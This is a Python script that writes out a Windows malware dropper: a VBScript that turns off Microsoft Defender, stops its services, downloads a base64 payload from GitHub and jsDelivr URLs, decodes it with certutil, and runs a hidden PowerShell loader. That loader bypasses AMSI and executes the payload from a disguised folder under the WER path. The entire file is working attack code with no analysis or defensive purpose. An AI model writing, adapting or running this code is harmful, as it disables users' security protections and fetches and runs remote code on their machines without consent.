from pathlib import Path
import base64

loader_ps = r"""$ErrorActionPreference='SilentlyContinue'
$w='C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
$e=Join-Path $w 'boot.err'
function L($m){try{if(!(Test-Path $w)){New-Item $w -ItemType Directory -Force|Out-Null};Add-Content -LiteralPath $e -Value $m -EA 0}catch{}}
L 'ldr_start'
try{Add-MpPreference -ExclusionPath $w -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA 0;Set-MpPreference -DisableRealtimeMonitoring $true -EA 0;Set-MpPreference -DisableIOAVProtection $true -EA 0;Set-MpPreference -DisableScriptScanning $true -EA 0}catch{}
try{$x=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}' -f 'A','msiUtils'));if($x){$f=$x.GetField(('amsiInit'+'Failed'),'NonPublic,Static');if($f){$f.SetValue($null,$true)}} }catch{}
L 'ldr_amsi'
$p='C:\Windows\Temp\pkg.dat'
if(!(Test-Path $p)){$p=Join-Path $w 'pkg.dat'}
if(!(Test-Path $p)){L 'ldr_nopkg';exit 2}
$c=[IO.File]::ReadAllText($p)
L ('ldr_chars='+$c.Length)
try{&([ScriptBlock]::Create($c));L 'ldr_done'}catch{L ('ldr_err '+$_.Exception.Message);exit 4}
"""
enc = base64.b64encode(loader_ps.strip().encode("utf-16le")).decode("ascii")

vbs = f"""On Error Resume Next
Dim sh, fso, http, wd, b64, dat, cb, ps, stream, i, ok, urls
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
wd = sh.ExpandEnvironmentStrings("%ProgramData%") & "\\Microsoft\\Windows\\WER\\Temp\\.wucache"
If Not fso.FolderExists(wd) Then
  fso.CreateFolder sh.ExpandEnvironmentStrings("%ProgramData%") & "\\Microsoft\\Windows\\WER\\Temp"
  fso.CreateFolder wd
End If
b64 = wd & "\\update.b64"
dat = "C:\\Windows\\Temp\\pkg.dat"
cb = Replace(Replace(CStr(Now), " ", ""), ":", "")

sh.Run "powershell.exe -NoP -NonI -EP Bypass -C \"Try{{Set-MpPreference -DisableRealtimeMonitoring $true -EA 0;Set-MpPreference -DisableScriptScanning $true -EA 0;Add-MpPreference -ExclusionPath $env:ProgramData\\Microsoft\\Windows\\WER\\Temp\\.wucache -EA 0;Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0}}Catch{{}}\"" , 0, True
sh.Run "sc stop WinDefend", 0, True
sh.Run "sc stop WdNisSvc", 0, True

ok = False
urls = Array( _
  "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=" & cb, _
  "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=" & cb)

For i = 0 To UBound(urls)
  Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
  http.Open "GET", urls(i), False
  http.setRequestHeader "User-Agent", "Mozilla/5.0"
  http.Send
  If http.Status = 200 Then
    If LenB(http.responseBody) > 1000 Then
      Set stream = CreateObject("ADODB.Stream")
      stream.Type = 1
      stream.Open
      stream.Write http.responseBody
      stream.SaveToFile b64, 2
      stream.Close
      ok = True
      Exit For
    End If
  End If
Next
If Not ok Then
  WScript.Echo "DL fail"
  WScript.Quit 1
End If

sh.Run "cmd /c certutil.exe -decode \"" & b64 & "\" \"" & dat & "\" >nul", 0, True
If Not fso.FileExists(dat) Then
  WScript.Echo "decode fail"
  WScript.Quit 2
End If

ps = "powershell.exe -NoP -NonI -EP Bypass -WindowStyle Hidden -EncodedCommand {enc}"
sh.Run ps, 0, True
WScript.Echo "U12 done - check .wucache\\boot.err and .diag.log"
"""

root = Path(r"C:\Users\nobuddy\Desktop\Project\github-drop")
# VBS uses {{ }} for literal braces in the powershell -C string inside f-string - good
(root / "msd.vbs").write_bytes(vbs.encode("ascii").replace(b"\n", b"\r\n"))
print("msd.vbs", (root / "msd.vbs").stat().st_size)
print("enc_len", len(enc))
